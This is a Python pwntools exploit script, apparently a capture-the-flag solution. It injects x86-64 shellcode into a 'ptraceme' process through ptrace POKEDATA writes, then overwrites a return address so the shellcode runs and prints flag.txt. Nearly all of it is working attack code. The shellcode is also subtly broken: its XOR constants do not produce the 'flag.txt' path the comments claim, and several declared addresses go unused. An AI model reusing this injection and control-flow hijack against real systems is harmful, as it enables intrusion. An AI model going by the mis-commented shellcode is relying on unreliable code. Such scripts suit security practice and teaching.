from pwn import *

# Constants for ptrace operations
PTRACE_POKEDATA = 5  # Write memory
PTRACE_PEEKDATA = 2  # Read memory
PTRACE_GETREGS = 12  # Get registers

# Addresses for memory writing and execution
regs = 0x00007fffffffd4d0
binsh = 0x177b75
system = 0x41b80
target_address = 4210800

# Generate shellcode to open and print the flag file
shellcode = asm(
    """
    /* open("flag.txt", O_RDONLY) */
    xor rax, rax                /* rax = 0 (clear register) */
    mov rdi, 0x101010101010101  /* Set up placeholder for flag file path */
    xor rdi, 0x1010101067696c66 /* rdi = "flag.txt" (reversed for endianness) */
    push rdi                    /* Push "flag.txt" onto the stack */
    mov rdi, rsp                /* rdi = pointer to "flag.txt" */
    xor rsi, rsi                /* rsi = 0 (O_RDONLY) */
    mov rax, 2                  /* syscall number for open() */
    syscall                     /* Call open("flag.txt", O_RDONLY) */

    /* read(fd, buffer, 100) */
    mov rdi, rax                /* rdi = file descriptor from open() */
    mov rsi, rsp                /* rsi = buffer (reuse the stack) */
    mov rdx, 100                /* rdx = size (100 bytes) */
    xor rax, rax                /* rax = 0 (syscall number for read()) */
    syscall                     /* Call read(fd, buffer, 100) */

    /* write(1, buffer, 100) */
    mov rdi, 1                  /* rdi = file descriptor for stdout */
    mov rax, 1                  /* syscall number for write() */
    syscall                     /* Call write(1, buffer, 100) */
    """
)

# Pad shellcode to make it a multiple of 8 bytes
if len(shellcode) % 8 != 0:
    shellcode = shellcode.ljust((len(shellcode) + 7) // 8 * 8, b'\x00')

# Split shellcode into chunks of 8 bytes and convert to integers
data = [u64(shellcode[i:i + 8]) for i in range(0, len(shellcode), 8)]

# Add a termination marker (e.g., a null value) if needed
data.append(0)

# Start the target process
p = process("./ptraceme")

# Write shellcode to the target process's memory
addr = target_address
for chunk in data:
    p.sendline("1")
    p.sendline(str(PTRACE_POKEDATA))
    p.sendline(str(addr))
    p.sendline(str(chunk))
    addr += 8

# Set the return address to the start of the shellcode
p.sendline("1")
p.sendline(str(PTRACE_POKEDATA))
p.sendline(str(4210776))  # Address of the return pointer
p.sendline(str(target_address))

# Trigger execution
p.sendline("2")
#p.interactive()
